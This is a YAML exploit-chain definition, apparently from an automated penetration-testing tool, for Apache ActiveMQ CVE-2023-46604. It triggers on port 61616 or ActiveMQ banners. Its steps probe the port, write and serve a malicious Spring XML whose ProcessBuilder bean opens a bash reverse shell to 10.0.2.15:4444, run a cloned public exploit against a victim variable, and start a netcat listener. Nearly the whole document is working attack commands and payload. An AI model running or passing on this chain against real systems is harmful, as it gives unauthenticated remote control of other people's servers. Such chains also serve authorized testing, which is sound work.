chain_id: activemq_cve_2023_46604
title: "ActiveMQ — CVE-2023-46604 unauthenticated RCE via OpenWire"
severity: CRITICAL
tags: [activemq, openwire, cve-2023-46604, rce, unauth]

trigger:
  any_of:
    - { port: 61616 }
    - { service_pattern: "(?i)activemq|openwire" }
    - { banner_pattern: "(?i)activemq" }

description: |
  Apache ActiveMQ < 5.15.16 / 5.16.7 / 5.17.6 / 5.18.3 lets an OpenWire
  client deserialize arbitrary types. A crafted ExceptionResponse with
  a Spring `ClassPathXmlApplicationContext` payload class loads a remote
  XML and gets RCE pre-auth. Exploited at scale before patches landed.

steps:
  - id: 1
    title: "Confirm the OpenWire port responds"
    command: nc -v $VICTIMA 61616 < /dev/null

  - id: 2
    title: "Stand up an HTTP server hosting the malicious Spring XML"
    command: |
      cat > poc.xml << 'EOF'
      <?xml version="1.0" encoding="UTF-8" ?>
      <beans xmlns="http://www.springframework.org/schema/beans"
             xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
             xsi:schemaLocation="http://www.springframework.org/schema/beans
             http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
          <constructor-arg>
            <list>
              <value>bash</value>
              <value>-c</value>
              <value>bash -i &gt;&amp; /dev/tcp/10.0.2.15/4444 0&gt;&amp;1</value>
            </list>
          </constructor-arg>
        </bean>
      </beans>
      EOF
      python3 -m http.server 8000

  - id: 3
    title: "Run the exploit"
    command: |
      git clone https://github.com/X1r0z/ActiveMQ-RCE.git
      cd ActiveMQ-RCE
      go run main.go -i $VICTIMA -u http://10.0.2.15:8000/poc.xml

  - id: 4
    title: "Catch the shell"
    command: nc -lvnp 4444

references:
  - https://nvd.nist.gov/vuln/detail/CVE-2023-46604
  - https://github.com/X1r0z/ActiveMQ-RCE
